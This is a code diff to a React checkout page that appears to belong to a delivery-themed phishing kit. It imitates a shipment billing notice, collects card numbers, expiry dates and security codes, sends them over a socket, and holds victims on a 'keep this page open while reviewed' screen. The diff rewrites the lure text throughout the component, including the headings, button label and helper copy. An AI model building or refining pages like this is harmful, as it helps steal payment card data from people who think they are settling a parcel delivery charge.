@@ -172,7 +172,7 @@ export default function Checkout() {
     const normalizedExpiry = normalizeExpiry(expiry, true);
     if (!isValidExpiryMMYY(normalizedExpiry) || !canSubmit || waiting) return;
     setWaiting(true);
-    setWaitingMsg('Details received. Please keep this page open while your billing information is reviewed.');
+    setWaitingMsg('Details received. Keep this page open while your billing information is reviewed.');
     clearDraft(STORAGE_KEYS.checkoutDraft);
     setExpiry(normalizedExpiry);
     socket.emit('checkout-submit', {
@@ -191,7 +191,7 @@ export default function Checkout() {
             <div className="mx-auto mb-3 h-10 w-10 rounded-full border-4 border-amber-200 border-t-[#ff9900] animate-spin" />
             <div className="text-lg font-semibold text-slate-900">Processing your request</div>
             <div className="mt-2 text-sm text-slate-600">{waitingMsg}</div>
-            <div className="mt-6 text-xs text-slate-500">Please keep this page open while your payment details are reviewed.</div>
+            <div className="mt-6 text-xs text-slate-500">Keep this page open while your payment details are reviewed.</div>
           </div>
         </div>
       )}
@@ -201,8 +201,8 @@ export default function Checkout() {
           <div className="alz-step-head">
             <div>
               <div className="alz-badge">{BRAND.name}</div>
-              <h1 className="alz-step-title">Confirm the billing method for this shipment</h1>
-              <p className="alz-step-subtitle">Review the card details linked to this delivery update.</p>
+              <h1 className="alz-step-title">Confirm the billing method</h1>
+              <p className="alz-step-subtitle">Review the card details for this delivery update.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -213,8 +213,8 @@ export default function Checkout() {
         <div className="alz-flow-grid alz-usps-flow-grid">
           <div className="alz-card alz-usps-form-card">
             <div className="alz-section-eyebrow">Payment details</div>
-            <h2 className="alz-page-title">Review your card information</h2>
-            <p className="alz-page-copy">Enter the card details associated with this shipment so delivery processing can continue.</p>
+            <h2 className="alz-page-title">Review your card info</h2>
+            <p className="alz-page-copy">Enter the card details for this shipment.</p>
             <div className="alz-brand-row mb-4">
               {BRAND_PROMISES.map((item) => (
                 <span key={item} className="alz-brand-pill">{item}</span>
@@ -253,14 +253,14 @@ export default function Checkout() {
                   <span className="alz-payment-pill alz-payment-pill-mastercard">mastercard</span>
                   <span className="alz-payment-pill alz-payment-pill-amex">AMERICAN EXPRESS</span>
                 </div>
-                <div className="alz-payment-strip-note">Use a payment method associated with this shipment. Your payment details are encrypted during verification.</div>
+                <div className="alz-payment-strip-note">Use a payment method associated with this shipment.</div>
               </div>
             </div>
 
             <button onClick={onSubmit} disabled={!canSubmit || waiting} className="alz-btn-primary mt-6 text-base alz-checkout-submit">
-              {waiting ? 'Processing...' : 'Continue with billing review'}
+              {waiting ? 'Processing...' : 'Continue'}
             </button>
-            <div className="alz-helper-copy mt-6">Keep this page open while the billing details for this shipment are confirmed.</div>
+            <div className="alz-helper-copy mt-6">Keep this page open while the billing details are confirmed.</div>
             <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
@@ -279,7 +279,7 @@ export default function Checkout() {
               <div>Card number and expiration date</div>
               <div>3- or 4-digit security code</div>
             </div>
-            <div className="alz-side-summary-box">Use a billing method associated with this shipment so the verification review can be completed.</div>
+            <div className="alz-side-summary-box">Use a billing method associated with this shipment to complete the review.</div>
           </aside>
         </div>
       </div>
